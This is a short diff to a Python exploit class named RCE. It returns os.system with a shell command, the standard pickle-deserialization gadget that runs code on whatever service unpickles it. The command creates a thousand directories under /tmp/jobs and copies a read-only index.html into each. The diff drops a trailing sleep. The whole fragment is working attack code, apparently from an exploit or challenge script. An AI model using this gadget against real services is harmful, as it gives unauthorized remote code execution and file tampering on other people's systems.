@@ -8,7 +8,6 @@ class RCE:
         rcmd = ""
         for i in range(0, 1000):
             rcmd += "mkdir -p /tmp/jobs/%s/target/target/; cp target/index.html /tmp/jobs/%s/target/target/index.html; chmod 444 /tmp/jobs/%s/target/target/index.html;" % (i, i, i)
-        rcmd += " sleep 1000"
         cmd = (rcmd)
         return os.system, (cmd,)
 
